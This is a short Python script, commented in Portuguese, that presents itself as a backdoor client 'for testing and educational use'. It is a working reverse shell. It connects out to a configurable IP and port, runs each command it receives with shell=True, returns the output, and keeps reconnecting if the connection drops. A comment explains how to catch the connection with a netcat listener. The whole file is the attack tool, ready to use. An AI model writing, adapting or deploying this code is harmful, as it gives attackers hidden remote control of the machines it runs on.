#!/usr/bin/env python
# -*- coding: utf-8 -*-

# coded by: Bob Slavtrievich
# Backdoor ( CLIENT ) para testes de sistemas e uso educacional
# GitHub: https://github.com/bobslavtrievich

from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE
from time import sleep
from os import fork

ip = "127.0.0.1"	# ip da sua maquina
porta = 7777		# porta da sua maquina

# Abra uma conexao com netcat na sua maquina, e execute o bk
#  netcat -kllp <porta>

# Obs: é preciso uma conexao em NAT na rede da sua maquina


def conectar(ip, porta, s):
   try:
      s.connect_ex((ip, porta))
      s.sendall(b"\n [>>] Maquina conectada !\n\n")
   except:
      s.close()
      main()
   finally:
      return s

def shell(s):
   while True:
      try:
         s.sendall(b"\n [!] SHELL >> ")
         dados = s.recv(4096)
         p = Popen(dados, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
         saida = p.stdout.read() + p.stderr.read()
#        saida = saida.encode() + '\n'
         s.sendall(b' \n' + saida)
      except:
         s.close()
         main()

def main():
   s = socket(AF_INET, SOCK_STREAM)

   try:
      conexao = conectar(ip, porta, s)

      if conexao:
         shell(s)

   except:
      sleep(5)
      main()

if __name__ == "__main__":
   main()
